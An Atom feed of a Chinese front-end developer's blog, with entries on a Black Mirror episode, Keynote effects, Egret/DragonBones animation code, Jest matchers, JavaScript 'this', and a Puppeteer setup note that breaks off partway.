<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>zhou shaw</title>
  
  <subtitle>zhou shaw&#39;s blog</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://zhoushaw.github.io/"/>
  <updated>2019-06-15T15:57:16.697Z</updated>
  <id>http://zhoushaw.github.io/</id>
  
  <author>
    <name>zhou shaw</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>《黑镜》圣诞特别篇：人间地狱</title>
    <link href="http://zhoushaw.github.io/2019/06/14/other/life/%E9%BB%91%E9%95%9C-%E5%9C%A3%E8%AF%9E%E7%89%B9%E5%88%AB%E7%AF%87/"/>
    <id>http://zhoushaw.github.io/2019/06/14/other/life/黑镜-圣诞特别篇/</id>
    <published>2019-06-14T03:39:35.000Z</published>
    <updated>2019-06-15T15:57:16.697Z</updated>
    
    <content type="html"><![CDATA[<div><a id="more"></a></div><h2 id="故事简介"><a href="#故事简介" class="headerlink" title="故事简介"></a>故事简介</h2><p>　圣诞节将至，一间地处偏远的小木屋里，波特（拉菲·斯波 Rafe Spall 饰）和马特（乔恩·哈姆 Jon Hamm 饰）同坐一桌，用红酒和烤土豆庆祝这个银装素裹的节日。波特沉默寡言，无精打采，而马特却恰恰相反，为了逗波特讲话，他向波特讲述了自己的过去。<br>　　曾经的马特是一名“恋爱导师”，他通过摄像头和网络“远程操控”他的客户，让这些平日里无人问津的“宅男”们能够在派对山成功抱得美人归。然而，一场意外让马特决定永远离开这个他经营得风生水起的行当，此间究竟发生了什么？听了马特的叙述，波特终于决定向马特讲述自己的故事，这个故事关乎于他和他的女友，但并不完全关乎于爱情。　　</p><h2 id="随笔"><a href="#随笔" class="headerlink" title="随笔"></a>随笔</h2><p>看完黑镜的圣诞特别篇，感到特别沉重</p><p>人间有地狱吗，有！科技造就地狱，虽然影片中的科技现在还不存在，但是能真真切切的感受到与我们非常贴近，原来我们认为地狱是死后给恶人去的地方，但是科技可以将我们人类带往地狱！</p><p>想象你被全世界所有人屏蔽，你无法与其他人交流你看到的其他人一团模糊的白影，其他人也无法和你交流你也是一团影子。想象一下你的意识一分钟就是一千年，你无法做任何事情，在这千年里有一个永远关不掉的收音机，砸碎了，回头，发现还在，不停重复。这不是地狱是什么？</p>]]></content>
    
    <summary type="html">
    
      &lt;div&gt;
    
    </summary>
    
      <category term="life" scheme="http://zhoushaw.github.io/categories/life/"/>
    
    
      <category term="life" scheme="http://zhoushaw.github.io/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>keynote</title>
    <link href="http://zhoushaw.github.io/2019/05/25/other/feature/keynote/"/>
    <id>http://zhoushaw.github.io/2019/05/25/other/feature/keynote/</id>
    <published>2019-05-24T21:16:04.000Z</published>
    <updated>2019-05-30T13:54:54.765Z</updated>
    
    <content type="html"><![CDATA[<div><a id="more"></a></div><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>掌握一手高超ppt制作技能，在技术分享、晋升演讲，还是项目复盘ppt制作中无疑会更如鱼得水。尽管分享的内容是最主要的，但制作精良让人耳目一新的ppt才会让人更focus你的内容。</p><h2 id="常见特效制作"><a href="#常见特效制作" class="headerlink" title="常见特效制作"></a>常见特效制作</h2><h3 id="代码魔法移动"><a href="#代码魔法移动" class="headerlink" title="代码魔法移动"></a>代码魔法移动</h3><blockquote><p>最终效果</p></blockquote><p><img src="https://s10.mogucdn.com/mlcdn/c45406/190524_0432b7k5i74dceec7h2ejh8k622dk_450x253.gif" alt=""></p><blockquote><p>实现</p></blockquote><ul><li>点击text按钮<ul><li><img src="https://s10.mogucdn.com/mlcdn/c45406/190524_5j60a9d8ikd5jhjiijg657ja31b4b_47x26.png" alt=""></li></ul></li><li>将代码拷贝至text文本框中</li><li>构造<strong>“旧”</strong>，<strong>“新”</strong>两个代码片段（两页演示文稿）</li><li>抽取其中相同的元素</li><li>在<strong>“旧”</strong>代码文稿页增加动画效果-&gt; 神奇移动</li><li>设置匹配对象为<code>By Word</code></li><li><img src="https://s10.mogucdn.com/mlcdn/c45406/190524_3a1k9gi0a81g0c291593cc5ffcc1d_271x268.png" alt=""></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;div&gt;
    
    </summary>
    
      <category term="keynote" scheme="http://zhoushaw.github.io/categories/keynote/"/>
    
    
      <category term="keynote" scheme="http://zhoushaw.github.io/tags/keynote/"/>
    
  </entry>
  
  <entry>
    <title>Egret实战-动态条漫</title>
    <link href="http://zhoushaw.github.io/2019/05/06/learning/game/egret%E5%AE%9E%E6%88%98/"/>
    <id>http://zhoushaw.github.io/2019/05/06/learning/game/egret实战/</id>
    <published>2019-05-05T23:42:00.000Z</published>
    <updated>2019-06-14T15:31:02.020Z</updated>
    
    <content type="html"><![CDATA[<h2 id="h5活动构建思路"><a href="#h5活动构建思路" class="headerlink" title="h5活动构建思路"></a>h5活动构建思路</h2><p>如何制作一个类似于中国女子图鉴的项目呢。</p><blockquote><p>扫码访问：</p></blockquote><p><img width="200" src="https://s10.mogucdn.com/mlcdn/c45406/190506_2dl50cg7c5b79kf58a050fgch92ib_400x400.png"></p><blockquote><p>主要思路</p></blockquote><p>通过龙骨场景动画将将所有动画做成帧动画到龙骨中，通过滑动事件来控制帧切换的位置</p><blockquote><p>核心实现思想：</p></blockquote><ul><li>获取龙骨资源、并创建<code>dragonBones</code>实例对象。将龙骨场景对象添加至画布</li><li>构建一个滚动容器，容器的高度为视窗大小，设置宽度设置为视窗宽度，在滚动容器中内增加填充块,填充块的高度=<strong>(总的帧数<em> 滚动距离切换一帧 </em> 时间缩放) + 视窗高度</strong></li><li>创建<code>scroll</code>对象，将其设置为视窗大小，设置<code>滚动容器</code>对象为<code>scroll</code>的视域组件组件</li><li>使用<code>scroll</code>监听滚动高度，计算当前滚动条占总可滚动高度的百分比=“已滚动高度/(图片高度-视窗高度)”</li><li>获取<code>dragonBones</code>场景一共拥有多少帧，通过总帧数*当前百分比，得到用户滑动到当前所在帧数</li></ul><blockquote><p>对应知识点</p></blockquote><ul><li>滚动容器组件：<a href="http://developer.egret.com/cn/apidoc/index/name/eui.Scroller" target="_blank" rel="noopener">eui.scroller</a></li><li>龙骨动画控制：<a href="http://developer.egret.com/cn/apidoc/index/name/dragonBones.Animation" target="_blank" rel="noopener">dragonBones.animation</a></li></ul><blockquote><p>具体实现代码：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">private timeScale: number = 2;  // 时间缩放倍数，为2时表明帧数切换放慢两倍</span><br><span class="line">private frameFactor: number = 26; // 滚动一帧需要耗费的距离</span><br><span class="line">private totalFrames: number = 1672; // 总得帧数</span><br><span class="line">private totalPrgress: number = this.timeScale * this.frameFactor * this.totalFrames; // 总的滚动长度</span><br><span class="line">private dragonBones: Common.DragonParse;</span><br><span class="line"></span><br><span class="line">constructor () &#123;</span><br><span class="line">    // 龙骨脚手架中已添加COMMON公共方法，用来解析龙骨资源</span><br><span class="line">    this.dragonBones = Common.DragonParse.getDragonParseInstance();</span><br><span class="line">    this.egretFactory = this.dragonBones.getEgretFactory();</span><br><span class="line">    </span><br><span class="line">    // 获取龙骨资源</span><br><span class="line">    this.armatureDisplay = this.egretFactory.buildArmatureDisplay(&apos;listen_mother&apos;);</span><br><span class="line">    this.addView();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private addView () :void &#123;</span><br><span class="line">   // 获取视窗宽、高</span><br><span class="line">   const &#123; stageWidth, stageHeight &#125; = this.stage;</span><br><span class="line">   </span><br><span class="line">   // 创建滚动容器和填充块</span><br><span class="line">   const group = new eui.Group();</span><br><span class="line">   const placeHolder = new eui.Group();</span><br><span class="line"></span><br><span class="line">   placeHolder.width = stageWidth;</span><br><span class="line">   placeHolder.height = this.totalPrgress + stageHeight;</span><br><span class="line">   group.addChild(placeHolder);</span><br><span class="line"></span><br><span class="line">   //创建一个Scroller</span><br><span class="line">   this.scroller = new eui.Scroller();</span><br><span class="line">   this.scroller.bounces = false;</span><br><span class="line">   this.scroller.width = stageWidth;</span><br><span class="line">   this.scroller.height = stageHeight;</span><br><span class="line">   // 将group作为滚动的视域组件</span><br><span class="line">   this.scroller.viewport = group;</span><br><span class="line">   this.addChild(this.scroller);</span><br><span class="line">   </span><br><span class="line">   // 监听滚动变化</span><br><span class="line">    this.scroller.addEventListener(egret.Event.CHANGE, this.onScroll, this);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private onScroll () :void &#123;</span><br><span class="line">   // 获取滚动距离，并计算滚动百分比</span><br><span class="line">   const scrollV: number = this.scroller.viewport.scrollV;</span><br><span class="line">   const progress: number = scrollV / this.totalPrgress;</span><br><span class="line">   let curRateValue = ~~(this.totalFrames * progress);</span><br><span class="line"></span><br><span class="line">   this.setSwipeAndButton(curRateValue);</span><br><span class="line">   this.prevFrames = curRateValue;</span><br><span class="line">   </span><br><span class="line">   // 将设置龙骨动画播放到指定帧数</span><br><span class="line">   this.setProgress(progress);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private setProgress (progress: number) :void &#123;</span><br><span class="line">   this.armatureDisplay.animation.gotoAndStopByProgress(this.animationName, progress)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">|—— bin-debug   &lt;-编译后运行代码</span><br><span class="line">|—— libs        &lt;-第三方库</span><br><span class="line">|—— resource    &lt;-资源文件</span><br><span class="line">    |—— default.res.json    &lt;-资源索引目录</span><br><span class="line">    └── default.thm.json    &lt;-主题索引目录</span><br><span class="line">|—— scripts     &lt;-构建脚本</span><br><span class="line">|—— resource    &lt;-资源文件</span><br><span class="line">    |—— dragonbones    &lt;-龙骨资源目录</span><br><span class="line">        └── listen_mother    &lt;-母亲节活动龙骨资源</span><br><span class="line">|—— src         &lt;-项目源代码</span><br><span class="line">    |—— common          &lt;-公用方法库</span><br><span class="line">    |—— pages           &lt;-主要页面</span><br><span class="line">    |—— LoadingUI.ts    &lt;-loading组件</span><br><span class="line">    └── Main.ts         &lt;-入口文件</span><br><span class="line">└── template    &lt;-项目模板</span><br></pre></td></tr></table></figure><h2 id="制作场景动画"><a href="#制作场景动画" class="headerlink" title="制作场景动画"></a>制作场景动画</h2><blockquote><p>创建动画</p></blockquote><p><img width="300" src="https://s10.mogucdn.com/mlcdn/c45406/190515_2ghf8c42a3kji7l7l48e6jbkbafii_1050x672.png"></p><ul><li>选择创建龙骨动画</li></ul><blockquote><p>通过属性面板</p></blockquote><p><img width="200" src="https://s10.mogucdn.com/mlcdn/c45406/190512_1h0i16eg0f04lk03h128ih080ei3g_558x888.png"></p><ul><li>设置750宽、1260高</li><li>初始化起点位置，375、630</li></ul><h2 id="动画制作"><a href="#动画制作" class="headerlink" title="动画制作"></a>动画制作</h2><blockquote><p>逐帧动画和补间动画的差异</p></blockquote><ul><li>逐帧动画<ul><li>逐帧动画是在时间帧上逐帧绘制帧内容，每一帧带有不同的图</li><li>适合于表演很细腻的动画，如3D效果、人物或动物急剧转身等等效果</li><li>优点:有非常大的灵活性,表现任何想表现的内容</li><li>缺点:由于逐帧动画的帧序列内容不一样，不仅增加制作负担而且最终输出的文件量也很大</li></ul></li><li>补间动画<ul><li>只需要为动画的第一个关键帧和最后一个关键帧创建内容，两个关键帧之间帧的内容由龙骨自动生成，不需要人为处理</li><li>逐帧动画是由手工控制，帧与帧之间的过渡很可能会不自然、不连贯</li><li>过渡更为自然连贯。最后，相对于逐帧动画来说，补间动画的文件更小</li></ul></li></ul><h3 id="制作逐帧动画"><a href="#制作逐帧动画" class="headerlink" title="制作逐帧动画"></a>制作逐帧动画</h3><blockquote><p>起步</p></blockquote><ul><li>新建项目=&gt;创建龙骨动画=&gt;逐帧动画模板。</li><li>窗口菜单=&gt;属性面板</li><li>勾选画布=&gt;设定宽高=&gt;设定偏移方向</li><li>窗口菜单=&gt;资源面板</li><li>点击导入资源按钮或点击打开资源目录，将图片放入资源文件中</li><li>在资源面板拖入图片资源，即可</li></ul><blockquote><p>导出</p></blockquote><p>顶部栏导出按钮，按照默认“纹理集”即可</p><p><img width="400" src="https://s10.mogucdn.com/mlcdn/c45406/190515_3k31d6j2ijc64j232ke0d4b728c09_1080x70.png"></p><h3 id="制作补间动画"><a href="#制作补间动画" class="headerlink" title="制作补间动画"></a>制作补间动画</h3><p>补间动画思想：<strong>只需要为动画的第一个关键帧和最后一个关键帧创建内容，两个关键帧之间帧的内容自动生成，不需要人为处理</strong></p><blockquote><p>下面以龙骨动画的补间动画制作为例：</p></blockquote><p>在龙骨动画制作过程中，动画的对象必须以骨骼为单位</p><ul><li><p>切换至动画制作tab</p><ul><li><img width="400" src="https://s10.mogucdn.com/mlcdn/c45406/190515_5i77b4889d454d0aek8cif8l8beh6_844x384.png"></li></ul></li><li><p>进入场景后通过场景树选择需要制作动画的骨骼</p><ul><li><img width="200" src="https://s10.mogucdn.com/mlcdn/c45406/190515_5e4290dgi2g7c11c9h4061c4cblah_690x980.png"></li></ul></li><li><p>选中骨骼可进行：<strong>位移</strong>、<strong>旋转</strong>、<strong>缩放</strong>动画制作</p><ul><li>在时间轴上选中第0帧，在操作面板点击对应改变属性的旗子</li><li><img width="200" src="https://s10.mogucdn.com/mlcdn/c45406/190515_860j48c1g0f347e9jg553k8j6bl7h_1012x598.png"></li><li><img width="200" src="https://s10.mogucdn.com/mlcdn/c45406/190515_5g58g56ja53eil92eh6h12211ff0f_736x112.png"></li><li>选中第10帧，并通过操作面板或直接对骨骼记性属性更改</li><li><img width="200" src="https://s10.mogucdn.com/mlcdn/c45406/190515_7jieaa926glfbcc28i85i2hl03e1h_736x110.png"></li><li>点击黄色旗子，将会自动补充补间动画</li></ul></li><li><p>选中图片可进行：<strong>透明度</strong>、<strong>是否展示</strong></p><ul><li>打开属性面板</li><li><img width="100" src="https://s10.mogucdn.com/mlcdn/c45406/190515_436fehba4a05da0kg6hak2h268fc3_502x1000.png"></li><li>是否展示图片需要通过，自动关键</li><li><img width="100" src="https://s10.mogucdn.com/mlcdn/c45406/190515_2a4f690dl2caek417cf1ij40049dc_480x592.png"></li><li>自动关键帧开启后，会自动在当前关键帧记录所有的属性修改</li></ul></li></ul><h2 id="制作龙骨动画"><a href="#制作龙骨动画" class="headerlink" title="制作龙骨动画"></a>制作龙骨动画</h2><p><strong>龙骨动画一般用来制作人物行动，将人物整体作为骨架各部分作为骨骼，例如：手臂、大腿、小腿都是骨骼，其中大腿和小腿都是腿的子集</strong></p><blockquote><p>起步</p></blockquote><ul><li>新建项目=&gt;创建龙骨动画=&gt;龙骨动画模板</li><li>窗口菜单=&gt;属性面板</li><li>勾选画布=&gt;设定宽高=&gt;设定偏移方向</li><li>窗口菜单=&gt;资源面板</li><li>点击导入资源按钮或点击打开资源目录，将图片放入资源文件中</li><li>在资源面板拖入图片资源，即可</li><li>创建骨骼：在骨架装配tab栏=&gt;场景树中右击=&gt;插入=&gt;骨骼</li><li>将图片资源拖入骨骼中</li></ul><h3 id="一屏动画设计原则"><a href="#一屏动画设计原则" class="headerlink" title="一屏动画设计原则"></a>一屏动画设计原则</h3><ul><li>构建一个基本场景骨架，后续骨架放置基本骨架上，方便整体移动</li><li>物件退场需要与背景反方向运动，造成错落感。或顺方向退场，避免导致认为物品或人与背景不分离</li><li>龙骨动画设计时以最小十帧为单位，场景转换预留30~50帧，后续方便调整</li><li>帧动画设计图片以至少三帧不同动画，可以造成连续感</li><li>开始龙骨动画制作前，先确定好场景高度和宽度不会有大的变化，否则后续修改会造成整体调整</li><li>文字动画放置物品后</li><li>动画效果放置980像素内，否则在小屏幕手机上无法展示全面</li><li>帧动画切换中间过度衔接透明度变化</li></ul><h2 id="对应资源"><a href="#对应资源" class="headerlink" title="对应资源"></a>对应资源</h2><ul><li><a href="http://gitlab.mogujie.org/module/meili-module-h5-game-egret/tree/master" target="_blank" rel="noopener">白鹭魔方页基础模板</a></li><li><a href="http://wxgame.mogu-inc.com/#/playground?_k=hwilxd" target="_blank" rel="noopener">玩法平台-所有玩法聚合页</a></li><li><a href="http://gitlab.mogujie.org/zhangzhe/listen_mother" target="_blank" rel="noopener">母亲节项目地址</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;h5活动构建思路&quot;&gt;&lt;a href=&quot;#h5活动构建思路&quot; class=&quot;headerlink&quot; title=&quot;h5活动构建思路&quot;&gt;&lt;/a&gt;h5活动构建思路&lt;/h2&gt;&lt;p&gt;如何制作一个类似于中国女子图鉴的项目呢。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;扫码访问：
      
    
    </summary>
    
      <category term="game" scheme="http://zhoushaw.github.io/categories/game/"/>
    
    
      <category term="egret" scheme="http://zhoushaw.github.io/tags/egret/"/>
    
  </entry>
  
  <entry>
    <title>Jest</title>
    <link href="http://zhoushaw.github.io/2019/05/04/learning/font-end/test/jest/"/>
    <id>http://zhoushaw.github.io/2019/05/04/learning/font-end/test/jest/</id>
    <published>2019-05-04T03:01:35.000Z</published>
    <updated>2019-05-12T06:26:35.668Z</updated>
    
    <content type="html"><![CDATA[<h2 id="起步"><a href="#起步" class="headerlink" title="起步"></a>起步</h2><blockquote><p>安装</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save-dev jest</span><br></pre></td></tr></table></figure><blockquote><p><code>pageckage.json</code>配置</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;scripts&quot;: &#123;</span><br><span class="line">    &quot;test&quot;: &quot;jest&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Expect"><a href="#Expect" class="headerlink" title="Expect"></a>Expect</h2><p><code>Expect</code>是一个函数，第一个参数接收<code>value</code>,后面可接链式属性判断</p><ul><li><code>expect(value)</code><ul><li><code>expect(value).not.toEqual</code>: 与后面等式取反比较</li><li><code>toEqual(compareValue)</code>: <code>value</code> 与 <code>compareValue</code>必须完全相等</li></ul></li></ul><blockquote><p>自定义校验方法</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// 查询对象key值是否存在对象中</span><br><span class="line">expect.extend(&#123;</span><br><span class="line">    toContainKeys(received, keys) &#123;</span><br><span class="line">        const receivedKeys = Object.keys(received);</span><br><span class="line">        const pass = keys.every((val =&gt; receivedKeys.includes(val)));</span><br><span class="line">        if (pass) &#123;</span><br><span class="line">            return &#123;</span><br><span class="line">                message: () =&gt;</span><br><span class="line">                `expected $&#123;JSON.stringify(received)&#125; have contain $&#123;receivedKeys&#125;`,</span><br><span class="line">                pass: true,</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return &#123;</span><br><span class="line">                message: () =&gt;</span><br><span class="line">                `expected $&#123;JSON.stringify(received)&#125; don&apos;t have contain $&#123;receivedKeys&#125;`,</span><br><span class="line">                pass: false,</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;起步&quot;&gt;&lt;a href=&quot;#起步&quot; class=&quot;headerlink&quot; title=&quot;起步&quot;&gt;&lt;/a&gt;起步&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;安装&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;tab
      
    
    </summary>
    
      <category term="js" scheme="http://zhoushaw.github.io/categories/js/"/>
    
    
      <category term="js" scheme="http://zhoushaw.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript系列之this</title>
    <link href="http://zhoushaw.github.io/2019/04/23/learning/font-end/js/JavaScript-this/"/>
    <id>http://zhoushaw.github.io/2019/04/23/learning/font-end/js/JavaScript-this/</id>
    <published>2019-04-23T02:22:35.000Z</published>
    <updated>2019-04-27T13:21:01.130Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在JavaScript语言中存在一个<code>this</code>关键词，这个关键词指的是函数运行时所在的环境。由于函数可以在不同的运行环境执行，所以需要有一种机制，能够在函数体内部获得当前的运行环境（<strong>context</strong>）。所以，<code>this</code>就出现了，它的设计目的就是在函数体内部，指代函数当前的运行环境。</p><p>前一个系列的<strong>作用域</strong>讲过,作用域运用的是词法作用域，意味着是编写时确定的，但<strong>this</strong>与其工作原理完全不同，它的指向并不是编写时确定的，而是运行时确定。</p><h2 id="仅仅是“规则”"><a href="#仅仅是“规则”" class="headerlink" title="仅仅是“规则”"></a>仅仅是“规则”</h2><p>之前在阅读 You Don’t Know JS系列的: <strong>this &amp; Object Prototypes</strong>中，将this的指向总结了几条规则：</p><blockquote><p>函数调用方式与内部<code>this</code>指针关系：</p></blockquote><ol><li>直接调用:函数内部<code>this</code>指向全局对象<code>window</code></li><li>通过对象使用点来调用:函数内部this指向调用对象</li><li>触发事件调用函数:函数内部的<code>this</code>指向触发事件的对象</li><li>以<code>new</code>的方式来调用:函数内部<code>this</code>指向本次函数执行时对应的一个匿名对象（以new的方式创建的函数，函数名的首字母一般以大写字母开始）</li><li>通过<code>call</code>的方法来间接调用方法:函数内部this指向<code>call</code>方法的第一参数对象,我们可以创建结构相同，但内容不同的对象</li></ol><h2 id="不仅仅是“规则”"><a href="#不仅仅是“规则”" class="headerlink" title="不仅仅是“规则”"></a>不仅仅是“规则”</h2><p>参考了上面的规则发现，<code>this</code>的指向无论如何都逃脱不了上面的<strong>5大原则</strong>,那它们之前是否存在一定的规律呢，或者说是什么来决定<code>this</code>的指向的。</p><p>通常我们会对一下例子的结果没法准确的确定<code>this</code>指向：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var name = &apos;zhou&apos;;</span><br><span class="line">var obj = &#123;</span><br><span class="line">    name: &apos;shaw&apos;,</span><br><span class="line">    say: function () &#123;</span><br><span class="line">        console.log(this.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">obj.say();  </span><br><span class="line"></span><br><span class="line">var say = obj.say;</span><br><span class="line">say();</span><br></pre></td></tr></table></figure><blockquote><p>上面的输出结果会是什么呢：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">obj.say(); // 输出shaw</span><br><span class="line">say();  // 输出zhou</span><br></pre></td></tr></table></figure><p>为什么这里<code>obj.say</code>和<code>say</code>的输出结果会不一致呢？下面我们来一探究竟。</p><p><code>this</code>的指向与数据在内存里的数据结构有关:</p><p>上面案例里的<code>obj</code>对象是如何在内存中存储的呢</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">obj.say-&gt; &#123;</span><br><span class="line">    [[value]]: say函数地址</span><br><span class="line">    [[write]]: true,</span><br><span class="line">    [[readable]]: true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际上<code>say</code>函数并没有存储在<code>obj</code>对象中，它只存储了<code>say</code>函数的地址。</p><p>我们直接通过<code>obj.say</code>来调用函数，与<code>obj.say</code>赋值给<code>say</code>变量调用完全不同，因为<code>obj</code>中存储的是<code>say函数</code>的地址，我们进行赋值操作时直接将say函数地址直接赋值过去了，而不是我们想象的将<code>obj.say</code>引用赋值过去。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在JavaScript语言中存在一个&lt;code&gt;this&lt;/code&gt;关键词，这个关键词指的是函数运行时所在的环境。由于函数可以在不同的运行
      
    
    </summary>
    
      <category term="js" scheme="http://zhoushaw.github.io/categories/js/"/>
    
    
      <category term="js" scheme="http://zhoushaw.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>puppeteer爬虫实战</title>
    <link href="http://zhoushaw.github.io/2019/04/23/learning/node/puppeteer/"/>
    <id>http://zhoushaw.github.io/2019/04/23/learning/node/puppeteer/</id>
    <published>2019-04-22T20:18:35.000Z</published>
    <updated>2019-05-12T06:26:35.669Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>待补充….</p><h2 id="centOs7-0无法运行问题"><a href="#centOs7-0无法运行问题" class="headerlink" title="centOs7.0无法运行问题"></a>centOs7.0无法运行问题</h2><p>centos必须升级到7.0以上否则会遇到依赖版本缺失问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">yum install ipa-gothic-fonts xorg-x11-fonts-100dpi xorg-x11-fonts-75dpi xorg-x11-utils xorg-x11-fonts-cyrillic xorg-x11-fonts-Type1 xorg-x11-fonts-misc -y</span><br><span class="line"></span><br><span class="line">yum install pango.x86_64 libXcomposite.x86_64 libXcursor.x86_64 libXdamage.x86_64 libXext.x86_64 libXi.x86_64 libXtst.x86_64 cups-libs.x86_64 libXScrnSaver.x86_64 libXrandr.x86_64 GConf2.x86_64 alsa-lib.x86_64 atk.x86_64 gtk3.x86_64 -y</span><br><span class="line"></span><br><span class="line"># 再安装NSS的依赖：</span><br><span class="line">yum install nss.x86_64</span><br><span class="line"></span><br><span class="line"># puppeteer的执行文件中去沙箱运行：</span><br><span class="line">browser = await puppeteer.launch(&#123;</span><br><span class="line">  headless: true,</span><br><span class="line">  args: [&apos;--no-sandbox&apos;, &apos;--disable-setuid-sandbox&apos;]</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="puppeteer启动配置"><a href="#puppeteer启动配置" class="headerlink" title="puppeteer启动配置"></a>puppeteer启动配置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const puppeteer = require(&apos;puppeteer&apos;);</span><br><span class="line">const browser = await puppeteer.launch([options]);</span><br></pre></td></tr></table></figure><ul><li>options<ul><li>headless <code>&lt;boolean&gt;</code> 以界面形式运行</li><li>devtools <code>&lt;boolean&gt;</code> 打开开发者工具栏</li></ul></li></ul><h2 id="页面对象附带"><a href="#页面对象附带" class="headerlink" title="页面对象附带"></a>页面对象附带</h2><blockquote><p>page.emulate</p></blockquote><p>模仿真实手机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 